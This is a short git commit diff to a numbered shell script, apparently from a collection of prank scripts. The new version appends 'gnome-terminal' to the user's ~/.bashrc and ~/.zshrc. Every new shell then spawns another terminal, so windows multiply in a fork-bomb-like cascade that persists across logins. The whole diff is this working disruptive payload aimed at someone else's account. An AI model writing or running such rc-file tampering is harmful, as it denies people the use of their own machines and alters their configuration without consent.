d46b23c0b61848d01e308b55c7b8c47162b82f3e
skyf0l <tom.rorato@epitech.eu>
2021-10-12 16:42:55 +0200

    gnome-terminal

--- scripts/2.sh
+++ scripts/2.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-# Desc: disable wifi, to enable it `ifup wlan0`
-echo "" >> ~/.bashrc
-echo "" >> ~/.zshrc
+# Desc: gnome-terminal
+echo "gnome-terminal" >> ~/.bashrc
+echo "gnome-terminal" >> ~/.zshrc
